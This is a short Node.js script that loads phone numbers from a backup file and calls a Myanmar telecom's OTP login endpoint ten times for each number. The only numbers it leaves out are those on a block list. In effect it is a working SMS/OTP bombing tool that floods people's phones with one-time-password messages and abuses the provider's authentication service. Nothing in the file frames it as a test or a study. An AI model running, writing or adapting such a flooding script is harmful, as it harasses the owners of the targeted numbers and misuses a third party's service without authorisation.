const axios = require("axios");
const fs = require("fs");

// ✅ Read phone numbers from backup.json
function loadBackupPhones() {
  try {
    const raw = fs.readFileSync("backup.json", "utf8");
    const parsed = JSON.parse(raw);
    return parsed.map(p => p.phone);
  } catch (e) {
    console.error("❌ Error reading backup.json:", e.message);
    return [];
  }
}

// ✅ Read block list
function loadBlockList() {
  try {
    const raw = fs.readFileSync("block.json", "utf8");
    const parsed = JSON.parse(raw);
    return parsed.map(p => p.phone);
  } catch (e) {
    console.warn("⚠️ No block.json or error reading, skipping block list.");
    return [];
  }
}

// ✅ Send OTP 10 times
async function sendOtp(phone) {
  for (let i = 0; i < 10; i++) {
    try {
      const url = `https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${phone}`;
      const res = await axios.get(url);
      if (res.status === 200) {
        console.log(`✅ (${i + 1}/10) OTP sent to ${phone}`);
      } else {
        console.log(`⚠️ (${i + 1}/10) Failed for ${phone}: Status ${res.status}`);
      }
    } catch (e) {
      console.error(`❌ (${i + 1}/10) Error for ${phone}: ${e.message}`);
    }
  }
}

// ✅ Main
async function main() {
  const phones = loadBackupPhones();
  const blocked = loadBlockList();

  for (const phone of phones) {
    if (blocked.includes(phone)) {
      console.log(`⏭ Skipped blocked phone: ${phone}`);
      continue;
    }
    await sendOtp(phone);
  }

  console.log("✅ All OTPs sent from backup.json (excluding block list).");
}

main();
